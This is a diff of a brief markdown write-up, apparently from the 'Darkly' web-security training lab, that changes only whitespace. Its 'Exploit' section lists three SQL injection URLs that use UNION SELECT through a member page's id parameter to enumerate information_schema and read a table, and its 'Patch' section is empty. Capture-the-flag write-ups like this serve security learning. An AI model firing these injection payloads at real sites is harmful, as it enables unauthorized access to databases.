@@ -1,16 +1,12 @@
 ## Exploit
 
-
-
 http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20TABLE_SCHEMA,COLUMN_NAME%20FROM%20information_schema.columns&Submit=Submit#
 
 http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20TABLE_NAME,COLUMN_NAME%20FROM%20information_schema.columns&Submit=Submit#
 
 http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20title,comment%20FROM%20Member_images.list_images&Submit=Submit#
 
-
 ## Patch
-
 
 ## Resources
 
